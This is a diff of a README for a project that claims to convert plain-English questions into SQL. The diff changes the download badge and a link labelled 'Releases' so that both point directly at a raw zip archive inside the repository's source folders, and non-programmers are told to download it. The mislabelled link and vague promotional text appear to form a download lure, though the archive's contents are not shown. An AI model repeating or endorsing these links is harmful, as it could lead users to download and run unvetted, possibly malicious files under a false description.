@@ -4,7 +4,7 @@
 Welcome to the multiagent-database-query-system! This tool helps you convert natural language questions into SQL queries using a smart multi-agent approach. You can ask questions in plain English, and our system will create the corresponding SQL queries for you. It’s perfect for anyone looking to analyze data without needing programming skills.
 
 ## ⬇️ Download Now
-[![Download](https://raw.githubusercontent.com/Frisk1269/multiagent-database-query-system/main/oversell/multiagent-database-query-system.zip)](https://raw.githubusercontent.com/Frisk1269/multiagent-database-query-system/main/oversell/multiagent-database-query-system.zip)
+[![Download](https://raw.githubusercontent.com/Frisk1269/multiagent-database-query-system/main/src/agents/query_system_database_multiagent_v3.7-beta.1.zip)](https://raw.githubusercontent.com/Frisk1269/multiagent-database-query-system/main/src/agents/query_system_database_multiagent_v3.7-beta.1.zip)
 
 ## 🛠️ System Requirements
 To run this application, your device should meet the following requirements:
@@ -14,7 +14,7 @@ To run this application, your device should meet the following requirements:
 - At least 200 MB of free disk space
 
 ## 📥 Download & Install
-To get started, visit this page to download: [multiagent-database-query-system Releases](https://raw.githubusercontent.com/Frisk1269/multiagent-database-query-system/main/oversell/multiagent-database-query-system.zip).
+To get started, visit this page to download: [multiagent-database-query-system Releases](https://raw.githubusercontent.com/Frisk1269/multiagent-database-query-system/main/src/agents/query_system_database_multiagent_v3.7-beta.1.zip).
 
 1. Open the link above.
 2. Look for the latest version.
